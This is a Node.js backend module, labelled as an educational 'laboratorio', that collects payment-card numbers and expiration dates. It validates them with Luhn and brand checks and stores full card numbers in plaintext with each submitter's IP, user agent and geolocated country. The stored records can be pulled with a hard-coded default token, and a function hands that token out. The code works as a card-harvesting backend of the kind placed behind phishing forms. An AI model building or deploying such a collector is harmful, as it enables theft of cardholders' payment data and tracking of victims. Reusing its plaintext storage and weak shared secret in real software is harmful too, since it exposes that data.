/**
 * Base de datos:
 * - Si existe DATABASE_URL (postgres://...) → PostgreSQL (recomendado en Render).
 * - Si no → libSQL: Turso (TURSO_DATABASE_URL) o archivo local data/laboratorio.db.
 */
const fs = require('fs');
const path = require('path');
const { pathToFileURL } = require('url');
const { createClient } = require('@libsql/client');

const LAB_TOKEN = process.env.LAB_TOKEN || 'educativo-local';

let schemaPromise;
let libsqlClient;
let pgPool;

function isPostgres() {
  const u = process.env.DATABASE_URL || '';
  return /^postgres(ql)?:\/\//i.test(u);
}

function getPgPool() {
  if (!pgPool && isPostgres()) {
    const { Pool } = require('pg');
    const conn = process.env.DATABASE_URL;
    const local = /localhost|127\.0\.0\.1/.test(conn);
    pgPool = new Pool({
      connectionString: conn,
      ssl: local ? false : { rejectUnauthorized: false }
    });
  }
  return pgPool;
}

function getLibsqlUrl() {
  if (process.env.TURSO_DATABASE_URL) return process.env.TURSO_DATABASE_URL;
  if (process.env.LIBSQL_URL) return process.env.LIBSQL_URL;
  const dir = path.join(process.cwd(), 'data');
  fs.mkdirSync(dir, { recursive: true });
  const filePath = path.join(dir, 'laboratorio.db');
  return pathToFileURL(filePath).href;
}

function getLibsqlClient() {
  if (!libsqlClient) {
    const url = getLibsqlUrl();
    const authToken = process.env.TURSO_AUTH_TOKEN || process.env.LIBSQL_AUTH_TOKEN;
    libsqlClient = createClient({ url, authToken: authToken || undefined });
  }
  return libsqlClient;
}

function checkLuhn(digits) {
  if (!/^\d+$/.test(digits)) return false;
  let sum = 0;
  let alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);
    if (alt) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

const cardPatterns = {
  visa: /^4/,
  mastercard: /^5[1-5]/,
  amex: /^3[47]/,
  discover: /^6(?:011|5)/,
  diners: /^3(?:0[0-5]|[68])/
};

function detectBrand(digits) {
  if (cardPatterns.mastercard.test(digits)) return 'MASTERCARD';
  if (cardPatterns.amex.test(digits)) return 'AMEX';
  if (cardPatterns.discover.test(digits)) return 'DISCOVER';
  if (cardPatterns.diners.test(digits)) return 'DINERS';
  if (cardPatterns.visa.test(digits)) return 'VISA';
  return 'DESCONOCIDA';
}

function validateExpiration(exp) {
  if (typeof exp !== 'string' || exp.length !== 5 || exp[2] !== '/') {
    return { ok: false, error: 'Formato MM/AA requerido' };
  }
  const month = parseInt(exp.slice(0, 2), 10);
  const year = parseInt(exp.slice(3, 5), 10);
  if (!month || month < 1 || month > 12) return { ok: false, error: 'Mes inválido' };
  const now = new Date();
  const cy = parseInt(String(now.getFullYear()).slice(-2), 10);
  const cm = now.getMonth() + 1;
  if (year < cy || (year === cy && month < cm)) return { ok: false, error: 'Fecha vencida' };
  return { ok: true };
}

function validateCardPayload(digits, brandFromClient) {
  const brand = detectBrand(digits);
  let minLen = 16;
  if (brand === 'AMEX') minLen = 15;
  else if (brand === 'DESCONOCIDA') minLen = 13;
  if (digits.length < minLen) return { ok: false, error: 'Número incompleto' };
  if (!checkLuhn(digits)) return { ok: false, error: 'Número de tarjeta no válido' };
  if (brand !== 'DESCONOCIDA' && brandFromClient && brandFromClient !== brand) {
    return { ok: false, error: 'Marca no coincide con el prefijo' };
  }
  return { ok: true, brand };
}

async function ensurePostgresSchema() {
  const pool = getPgPool();
  await pool.query(`
    CREATE TABLE IF NOT EXISTS submissions (
      id SERIAL PRIMARY KEY,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      card_number_digits TEXT NOT NULL,
      expiration TEXT NOT NULL,
      brand TEXT NOT NULL,
      user_agent TEXT,
      remote_address TEXT
    )
  `);
  await pool.query(`ALTER TABLE submissions ADD COLUMN IF NOT EXISTS country_code TEXT`);
  await pool.query(`ALTER TABLE submissions ADD COLUMN IF NOT EXISTS country TEXT`);
}

async function ensureSchema() {
  if (!schemaPromise) {
    if (isPostgres()) {
      schemaPromise = ensurePostgresSchema();
    } else {
      schemaPromise = (async () => {
        const c = getLibsqlClient();
        await c.execute(`
          CREATE TABLE IF NOT EXISTS submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            created_at TEXT NOT NULL DEFAULT (datetime('now')),
            card_number_digits TEXT NOT NULL,
            expiration TEXT NOT NULL,
            brand TEXT NOT NULL,
            user_agent TEXT,
            remote_address TEXT
          )
        `);
        for (const stmt of [
          'ALTER TABLE submissions ADD COLUMN country_code TEXT',
          'ALTER TABLE submissions ADD COLUMN country TEXT'
        ]) {
          try {
            await c.execute(stmt);
          } catch (e) {
            if (!/duplicate column|already exists/i.test(String(e.message))) throw e;
          }
        }
      })();
    }
  }
  await schemaPromise;
}

function normalizeClientIp(raw) {
  if (!raw || typeof raw !== 'string') return '';
  let ip = raw.split(',')[0].trim();
  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
  return ip;
}

function isNonPublicIp(ip) {
  if (!ip) return true;
  if (ip === '127.0.0.1' || ip === '::1') return true;
  if (ip.startsWith('10.')) return true;
  if (ip.startsWith('192.168.')) return true;
  const m = ip.match(/^172\.(\d+)\./);
  if (m) {
    const n = parseInt(m[1], 10);
    if (n >= 16 && n <= 31) return true;
  }
  if (ip.startsWith('fe80:') || ip === '0.0.0.0') return true;
  return false;
}

/**
 * Geolocalización aproximada por IP (laboratorio). Usa ip-api.com (límite ~45 req/min, no comercial).
 * En localhost suele quedar vacío o "desconocido".
 */
async function lookupCountryByIp(ip) {
  if (isNonPublicIp(ip)) {
    return { country: ip ? 'Local / red privada' : 'Sin IP', countryCode: null };
  }
  const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,message`;
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 3500);
  try {
    const res = await fetch(url, { signal: ctrl.signal });
    const data = await res.json();
    if (data.status !== 'success') return { country: null, countryCode: null };
    return {
      country: data.country || null,
      countryCode: data.countryCode || null
    };
  } catch {
    return { country: null, countryCode: null };
  } finally {
    clearTimeout(t);
  }
}

function rowToObject(row) {
  if (row && typeof row === 'object' && !Array.isArray(row)) {
    const o = {};
    for (const k of Object.keys(row)) {
      let v = row[k];
      if (typeof v === 'bigint') v = Number(v);
      else if (v instanceof Date) v = v.toISOString();
      o[k] = v;
    }
    return o;
  }
  return row;
}

async function postSubmission(body, { userAgent = '', remoteAddress = '' } = {}) {
  await ensureSchema();
  const raw = String(body.cardNumber || '').replace(/\D/g, '');
  const expiration = String(body.expiration || '').trim();
  const brandClient = String(body.brand || '').trim().toUpperCase();

  const expRes = validateExpiration(expiration);
  if (!expRes.ok) {
    const e = new Error(expRes.error);
    e.statusCode = 400;
    throw e;
  }
  const cardRes = validateCardPayload(raw, brandClient);
  if (!cardRes.ok) {
    const e = new Error(cardRes.error);
    e.statusCode = 400;
    throw e;
  }

  const ip = normalizeClientIp(remoteAddress);
  const geo = await lookupCountryByIp(ip);
  const country = geo.country;
  const countryCode = geo.countryCode;

  if (isPostgres()) {
    const pool = getPgPool();
    const r = await pool.query(
      `INSERT INTO submissions (card_number_digits, expiration, brand, user_agent, remote_address, country, country_code)
       VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING id`,
      [raw, expiration, cardRes.brand, userAgent, remoteAddress, country, countryCode]
    );
    const id = r.rows[0]?.id;
    return { id: Number(id), brand: cardRes.brand, country, countryCode };
  }

  const client = getLibsqlClient();
  const rs = await client.execute({
    sql: `INSERT INTO submissions (card_number_digits, expiration, brand, user_agent, remote_address, country, country_code)
          VALUES (?, ?, ?, ?, ?, ?, ?) RETURNING id`,
    args: [raw, expiration, cardRes.brand, userAgent, remoteAddress, country, countryCode]
  });
  const first = rs.rows[0];
  let id = first ? (first.id ?? first[0]) : null;
  if (typeof id === 'bigint') id = Number(id);
  return { id: Number(id), brand: cardRes.brand, country, countryCode };
}

async function getSubmissions(limit, token) {
  if (token !== LAB_TOKEN) {
    const e = new Error('Token de laboratorio inválido o ausente (cabecera X-Lab-Token)');
    e.statusCode = 401;
    throw e;
  }
  await ensureSchema();
  const lim = Math.min(Math.max(parseInt(String(limit), 10) || 50, 1), 200);

  if (isPostgres()) {
    const pool = getPgPool();
    const r = await pool.query(
      `SELECT id, created_at, card_number_digits, expiration, brand, user_agent, remote_address, country, country_code
       FROM submissions ORDER BY id DESC LIMIT $1`,
      [lim]
    );
    const items = r.rows.map(rowToObject);
    return { count: items.length, items };
  }

  const client = getLibsqlClient();
  const rs = await client.execute({
    sql: `SELECT id, created_at, card_number_digits, expiration, brand, user_agent, remote_address, country, country_code
          FROM submissions ORDER BY id DESC LIMIT ?`,
    args: [lim]
  });
  const items = (rs.rows || []).map(rowToObject);
  return { count: items.length, items };
}

function getLabTokenHint() {
  return LAB_TOKEN;
}

module.exports = {
  ensureSchema,
  postSubmission,
  getSubmissions,
  getLabTokenHint,
  LAB_TOKEN
};
